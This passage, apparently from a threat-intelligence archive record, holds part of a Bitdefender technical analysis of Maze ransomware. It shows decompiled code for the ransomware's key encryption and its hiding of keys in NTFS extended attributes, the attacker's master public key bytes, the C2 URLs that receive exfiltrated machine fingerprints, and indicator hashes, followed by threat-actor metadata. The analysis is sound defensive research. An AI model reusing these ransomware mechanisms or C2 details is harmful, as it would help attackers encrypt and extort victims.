kn[1];\ntrailing_data[0] = v3;\n\n_// encrypt trailing data using Microsoft Crypto API_\n**if ( !v1->obj_47720->vtable->MsCryptEncrypt(**\n(HCRYPTKEY *)v1->obj_47720,\n(BYTE *)trailing_data,\n(DWORD *)&forty,\n256,\n0,\n0) )\n**return** 0;\n\n_// write trailing data (encrypted keys) to the end of file_\nj_SetFilePointerEx(v1->handle, 0, 0, SEEK_END);\nv7 = j_WriteFile(v1->handle, trailing_data, 264u, &NumberOfBytesWritten, 0);\n\nThe private computer key is then encrypted using a so-called “master” public key:\n\nPUBLICKEYSTRUC\n{\nBYTE  bType = PUBLICKEYBLOB;\nBYTE  bVersion = 2;\nWORD  reserved = 0;\nALG_ID aiKeyAlg = CALG_RSA_KEYX;\n}\n\n06 02 00 00 00 A4 00 00 52 53 41 31 00 08 00 00 01 00 01 00 BD 27 97 44\n6A E3 05 38 56 BA D9 4A 87 94 4D D2 DE 89 71 96 54 D4 07 0B 13 B8 A4 BB\n\n\n-----\n\nA Technical Look into Maze Ransomware\n\n94 C7 F6 C8 AC 40 72 C0 E6 61 2D 5E 11 0B 3D 58 17 3E 15 3C 11 D9 BF 9D\n1E B0 6B A0 4A C5 CE 92 D8 9C 18 A3 6A 81 A5 B6 C5 AE 85 32 52 60 8D 36\n67 6C 23 73 8A DA D8 F6 16 73 FC 02 C0 78 3B 2F 1A A6 AF 6B 74 D2 35 10\nF8 CA C2 7C 82 07 62 68 23 A8 99 0C 08 B5 CF B1 D9 EB 15 3B BF 0C BC A0\nA4 6B 92 BC 6A 68 CD A3 41 9E F0 A7 E1 6D BE 97 22 08 23 A7 DA 36 24 E3\n18 8A 11 A1 44 83 A4 0B 06 8D 9B CE 63 77 E3 39 FA 86 08 99 ED FC 1A 20\n33 99 E5 BD A1 BE 70 AC 49 BD 28 94 17 EE 2D F7 4F 15 62 C6 3F 3B E4 1B\n4B CE 27 4B AA 11 36 30 F2 C1 DB 29 31 06 38 1B CF B0 A3 AF 8F 19 8A 76\nEC 5C 1F DC D9 F4 BB F6 34 60 4B AF\n\n###### Afterwards, the computer private key is destroyed. However, the encrypted form of the private key is saved, and dumped in DECRYPT-FILES.txt as a Base64 block:\n\n---BEGIN MAZE KEY--24GFDOJs/fxp11F4kXLe7qtMhOvEOaHLNVt3Yv6IfVkVcbWxvZBSmVCw00buGYwux2efPZ\nEexyTPblCjM1w6cWlaVjX0Nv4HrufxumWTzeGcsTwCH8uFEtso07u5WUxQ7zGIMFV0j9TA\n...\nbgBkAG8AdwBzACAANwAgAFAAcgBvAGYAZQBzAHMAaQBvAG4AYQBsAAAAQih8AEMAXwBGAF\n8AMgAxADgANgA1ADQALwAyADYAMgAwADQAMQB8AAAASABQQFiJCGCJCGiJCHDb5UV4C4AB\n---END MAZE KEY--\nThe malware authors maintain possession of the “master” private key, needed to decrypt computer keys and files. File\ndecryption can be performed only if this private key is leaked or obtained otherwise. Factorizing the master private key\nfrom the public key is not practical, because of the key size.\n\n### Key persistence\n\nUsing another interesting trick, encrypted computer keys are hidden inside NTFS metadata, by using Extended\nAttributes. An empty file is created, %ProgramData%\\0x29A.db and a custom extended attribute named KREMEZ\nis set to that file, using NtQueryEaFile, NtSetEaFile functions:\n\n**if ( !j_SHGetFolderPathW(0, CSIDL_COMMON_APPDATA, 0, 0, this + 2) )**\n{\nj_lstrcatW(fileName + 2, a0x29aDb);\n_// get keys from EA of C:\\ProgramData\\0x29A.db_\n**if ( GetCachedInfoFromEaFile(fileName, (int)pubKey, (int)encPrivKey) )**\n**goto LABEL_9;**\n}\nv9 = 0;\n_// generate new computer keypair_\n**if ( GenerateRSAKeys((DWORD *)&privKey, pubKey) )**\n{\n_// encrypt computer private key with master public key_\n**if ( !EncryptChaChaRsa((int)&privKey, (int)encPrivKey) )**\n**goto LABEL_10;**\nv6 = a4;\n_// verify key length_\n**if ( pubKey[1] == 0x114 )**\n{\n_// add encrypted private key to data_\nM C (( i d i t) D t ( i d i t) P i K 0 694 )\n\n\n-----\n\nA Technical Look into Maze Ransomware\n\n_// add plaintext public key to data_\nMemCpy((unsigned int)&eaData[1684], *pubKey, 0x114u);\n_// persist data to EA of 0x29A.db file_\nWriteCacheInfoToEaFile(fileName, (BYTE *)eaData);\n}\n[...]\n_// destroy computer private key_\nv10 = privKey;\n**if ( privKey )**\nFREE_MEM(v10);\n\nThe data can be technically retrieved using public NTFS EA extraction tools, but is unusable without the master private\nkey.\n\n## Network connections\n\n###### Besides scanning network shares, the malware tries to connect to several C2 hosts for further instructions and\npossible data exfiltration. The list of contacted hosts was found encrypted in the binary, all IPs located in the Russian\nFederation.\n\nThe target URL contains one IP from the list, random English words and extensions like php or asp. We have\n###### seen the following outbound connections from this sample:\n\nPOST http://91.218.114.4/withdrawal/jfmd.do\nPOST http://91.218.114.11/view/messages/ugihhabxg.jspx?ar=0l868b71x\nPOST http://91.218.114.25/ex.action?gd=v5qh8a\nPOST http://91.218.114.26/post/account/eifxupy.aspx?e=p45ph1k&xen=j030&jxq=x&qe=4h78\nPOST http://91.218.114.31/lecfefe.jsp?ac=uqt38c3\nPOST http://91.218.114.32/rcqncstrcq.asp?xa=u&hgnt=883&e=y0hpt3n06c&a=e\nPOST http://91.218.114.37/support/check/is.aspx?y=ndf\nPOST http://91.218.114.38/aixffpqds.html?hdnw=72lr15&es=lwm7u8&tulq=6a43xi8\nPOST http://91.218.114.77/news/withdrawal/iku.jspx\nPOST http://91.218.114.79/sepa/ticket/idjyo.jspx?eri=wfb6bb2sr\n\n###### The data sent to the C2 hosts is the computer fingerprint described at the beginning of this chapter, and looks like this, before encryption:\n\n12938e04ce69e222\nUsername\nMACHINE-NAME\nnone\nWindows Name\n|\\\\remote-host\\shared-folder|\n|X_X_0/0|X_F_11111/22222|D_X_0/0\n|X_X_111111/444444|\n\n\n-----\n\nA Technical Look into Maze Ransomware\n\n## Indicators of compromise\n\nAn up-to-date list of indicators of compromise is available to Bitdefender Advanced Threat Intelligence users. More\ninformation about the program is available at https://www.bitdefender.com/oem/advanced-threat-intelligence.html.\n\n###### • Main executable sample: e69a8eb94f65480980deaf1ff5a431a6\n\n • CVE-2016-7255 exploit dll, 32-bit: 0e6552c7590de315878f73346f482b14\n\n • CVE-2016-7255 exploit dll, 64-bit: 79abd17391adc6251ecdc58d13d76baf\n\n • CVE-2018-8453 exploit shellcode, 32/64: 443f39b28a5b2434f1985f2fc43dc034\n\n • Contacted C2 hosts:\n\n91.218.114.4\n91.218.114.11\n91.218.114.25\n91.218.114.26\n91.218.114.31\n91.218.114.32\n91.218.114.37\n91.218.114.38\n91.218.114.77\n91.218.114.79\n\n## References\n\n- IDA disassembler: https://en.wikipedia.org/wiki/Interactive_Disassembler\n\n- HC-128 algorithm: https://www.esat.kuleuven.be/cosic/publications/article-1332.pdf\n\n- PE reflection: https://www.dc414.org/wp-content/uploads/2011/01/242.pdf\n\n- Transparent Deobfuscation With IDA Processor Module Extensions, Jun 2015, Rolf Rolles: https://www.\nmsreverseengineering.com/blog/2015/6/29/transparent-deobfuscation-with-ida-processor-module-extensions\n\n- Spaghetti code: https://en.wikipedia.org/wiki/Spaghetti_code\n\n- ADLER-32 checksum: https://en.wikipedia.org/wiki/Adler-32\n\n- Microsoft advisory CVE-2016-7255: https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-20167255\n\n- One Bit To Rule A System: Analyzing CVE-2016-7255 Exploit In The Wild, Dec 2016, Jack Tang: https://blog.\ntrendmicro.com/trendlabs-security-intelligence/one-bit-rule-system-analyzing-cve-2016-7255-exploit-wild/\n\n- Digging Into a Windows Kernel Privilege Escalation Vulnerability: CVE-2016-7255, Dec 2016, Stanley Zhu: https://\nwww.mcafee.com/blogs/other-blogs/mcafee-labs/digging-windows-kernel-privilege-escalation-vulnerabilitycve-2016-7255/\n\n\n-----\n\nA Technical Look into Maze Ransomware\n\n- WoW64: https://en.wikipedia.org/wiki/WoW64\n\n- ChaCha algorithm: https://en.wikipedia.org/wiki/Salsa20#ChaCha_variant\n\n- WoW64 Heaven’s Gate: https://www.malwaretech.com/2014/02/the-0x33-segment-selector-heavens-gate.html\n\n- System call: https://en.wikipedia.org/wiki/System_call\n\n- EPROCESS structure: https://www.nirsoft.net/kernel_struct/vista/EPROCESS.html\n\n- Microsoft advisory CVE-2018-8453: https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-20188453\n\n- From patch diff to EXP, CVE-2018-8453 vulnerability analysis and exploitation, [Part 1], Jan 2019, ze0r @\n360A-TEAM: https://mp.weixin.qq.com/s/ogKCo-Jp8vc7otXyu6fTig\n\n- Zero-day exploit (CVE-2018-8453) used in targeted attacks, Oct 2018, AMR, Kaspersky: https://securelist.com/cve2018-8453-used-in-targeted-attacks/88151/\n\n- CVE-2018-8453：Win32k Elevation of Privilege Vulnerability Targeting the Middle East, Qi Anxin: https://ti.360.net/\nblog/articles/cve-2018-8453-win32k-elevation-of-privilege-vulnerability-targeting-the-middle-east-en/\n\n- Computing fingerprint: https://en.wikipedia.org/wiki/Fingerprint_(computing)\n\n- Mutex object: https://docs.microsoft.com/en-us/windows/win32/sync/mutex-objects\n\n- Machine role: https://docs.microsoft.com/en-us/windows/win32/api/dsrole/ne-dsrole-dsrole_machine_role\n\n- Windows backup, shadow copy: https://en.wikipedia.org/wiki/Shadow_Copy\n\n- Windows Management Instrumentation: https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page\n\n- Windows file sharing: https://support.microsoft.com/en-us/help/4092694/windows-10-file-sharing-over-a-network\n\n- Data exfiltration: https://en.wikipedia.org/wiki/Data_exfiltration\n\n- Pseudo-random number generator: https://en.wikipedia.org/wiki/Pseudorandom_number_generator\n\n- Microsoft crypto API: https://en.wikipedia.org/wiki/Microsoft_CryptoAPI\n\n- RSA algorithm: https://en.wikipedia.org/wiki/RSA_(cryptosystem)\n\n- RSA encryption provider: https://docs.microsoft.com/en-us/windows/win32/seccrypto/prov-rsa-full\n\n- Base64 encoding: https://en.wikipedia.org/wiki/Base64\n\n- NTFS extended attributes: https://attack.mitre.org/techniques/T1096/\n\n- Tools for analysis and manipulation of extended attribute ($EA) on NTFS, Joakim Schicht: https://github.com/\njschicht/EaTools\n\n- Command and Control services: https://en.wikipedia.org/wiki/Botnet#Command_and_control\n\n\n-----\n\n###### Proudly Serving Our Customers Dedicated To Our +20.000 Worldwide Partners\nBitdefender provides solutions and services for small business and medium A channel-exclusive vendor, Bitdefender is proud to share success with tens of\nenterprises, service providers and technology integrators. We take pride in thousands of resellers and distributors worldwide.\nthe trust that enterprises such as Mentor, Honeywell, Yamaha, Speedway,\n**Esurance or Safe Systems place in us.** _CRN 5-Star Partner, 4th Year in a Row. Recognized on CRN’s Security 100 List. CRN Cloud_\n\n_Partner, 2nd year in a Row_\n\n_Leader in Forrester’s inaugural Wave™ for Cloud Workload Security_\n\n_More MSP-integrated solutions than any other security vendor_\n\n_NSS Labs “Recommended” Rating in the NSS Labs AEP Group Test_\n\n_3 Bitdefender Partner Programs - to enable all our partners – resellers, service providers_\n\n_SC Media Industry Innovator Award for Hypervisor Introspection, 2nd Year in_ _and hybrid partners – to focus on selling Bitdefender solutions that match their own_\n_a Row_ _specializations_\n\n_Gartner® Representative Vendor of Cloud-Workload Protection Platforms_\n\n###### Trusted Security Authority\nBitdefender is a proud technology alliance partner to major virtualization vendors, directly contributing to the development of secure ecosystems with VMware,\n**Nutanix, Citrix, Linux Foundation, Microsoft, AWS, and Pivotal.**\n\nThrough its leading forensics team, Bitdefender is also actively engaged in countering international cybercrime together with major law enforcement agencies\nsuch as FBI and Europol, in initiatives such as NoMoreRansom and TechAccord, as well as the takedown of black markets such as Hansa. Starting in 2019,\nBitdefender is also a proudly appointed CVE Numbering Authority in MITRE Partnership.\n\n**RECOGNIZED BY LEADING ANALYSTS AND INDEPENDENT TESTING ORGANIZATIONS** **TECHNOLOGY ALLIANCES**\n\n###### UNDER THE SIGN OF THE WOLF\n\n**Founded 2001, Romania** A trade of brilliance, data security is an industry where only the clearest view, sharpest mind and deepest insight can\n**Number of employees 1800+** win — a game with zero margin of error. Our job is to win every single time, one thousand times out of one thousand,\n\nand one million times out of one million.\n\n**Headquarters**\nEnterprise HQ – Santa Clara, CA, United States And we do. We outsmart the industry not only by having the clearest view, the sharpest mind and the deepest insight,\nTechnology HQ – Bucharest, Romania but by staying one step ahead of everybody else, be they black hats or fellow security experts. The brilliance of our\n\ncollective mind is like a luminous Dragon-Wolf on your side, powered by engineered intuition, created to guard against\n\n**WORLDWIDE OFFICES** all dangers hidden in the arcane intricacies of the digital realm.\n**USA & Canada: Ft. Lauderdale, FL | Santa Clara, CA | San Antonio, TX |**\nToronto, CA This brilliance is our superpower and we put it at the core of all our game-changing products and solutions.\n**Europe: Copenhagen, DENMARK | Paris, FRANCE | München, GERMANY |**\nMilan, ITALY | Bucharest, Iasi, Cluj, Timisoara, ROMANIA | Barcelona, SPAIN\n| Dubai, UAE | London, UK | Hague, NETHERLANDS\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://download.bitdefender.com/resources/files/News/CaseStudies/study/318/Bitdefender-TRR-Whitepaper-Maze-creat4351-en-EN-GenericUse.pdf"
    ],
    "report_names": [
        "Bitdefender-TRR-Whitepaper-Maze-creat4351-en-EN-GenericUse.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f4f16213-7a22-4527-aecb-b964c64c2c46",
            "created_at": "2024-06-19T02:03:08.090932Z",
            "updated_at": "2025-03-27T02:05:17.387119Z",
            "deleted_at": null,
            "main_name": "GOLD NIAGARA",
            "aliases": [
                "Carbanak",
                "Carbon Spider ",
                "FIN7 ",
                "Navigator ",
                "Sangria Tempest ",
                "TelePort Crew ",
                "Calcium "
            ],
            "source_name": "Secureworks:GOLD NIAGARA",
            "tools": [
                " Carbanak",
                " Cobalt Strike",
                " DICELOADER",
                " DRIFTPIN",
                " GGLDR",
                " GRIFFON",
                " JSSLoader",
                " Meterpreter",
                " OFFTRACK",
                " PILLOWMINT",
                " POWERTRASH",
                " SUPERSOFT",
                " TAKEOUT",
                " TinyMet",
                "Bateleur"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "d85adfe3-e1c3-40b0-b8bb-d1bacadc4d82",
            "created_at": "2022-10-25T16:07:23.619566Z",
            "updated_at": "2025-03-27T02:02:09.890982Z",
            "deleted_at": null,
            "main_name": "FIN7",
            "aliases": [
                "APT-C-11",
                "ATK 32",
                "Gold Niagara",
                "ITG14",
                "TAG-CR1"
            ],
            "source_name": "ETDA:FIN7",
            "tools": [
                "7Logger",
                "Agentemis",
                "Anunak",
                "Astra",
                "BIOLOAD",
                "BIRDWATCH",
                "Bateleur",
                "Boostwrite",
                "CROWVIEW",
                "Carbanak",
                "Cobalt Strike",
                "CobaltStrike",
                "DICELOADER",
                "DNSMessenger",
                "FOWLGAZE",
                "HALFBAKED",
                "JSSLoader",
                "KillACK",
                "LOADOUT",
                "Lizar",
                "Meterpreter",
                "Mimikatz",
                "POWERPLANT",
                "POWERSOURCE",
                "RDFSNIFFER",
                "SQLRAT",
                "Sekur",
                "Sekur RAT",
                "TEXTMATE",
                "Tirion",
                "VB Flash",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716504,
    "ts_updated_at": 1743041609,
    "ts_creation_date": 1618399872,
    "ts_modification_date": 1618399877,
    "files": {
        "pdf": "https://archive.orkl.eu/0e710f0040ca4c20db6c9502258e50518558175a.pdf",
        "text": "https://archive.orkl.eu/0e710f0040ca4c20db6c9502258e50518558175a.txt",
        "img": "https://archive.orkl.eu/0e710f0040ca4c20db6c9502258e50518558175a.jpg"
    }
}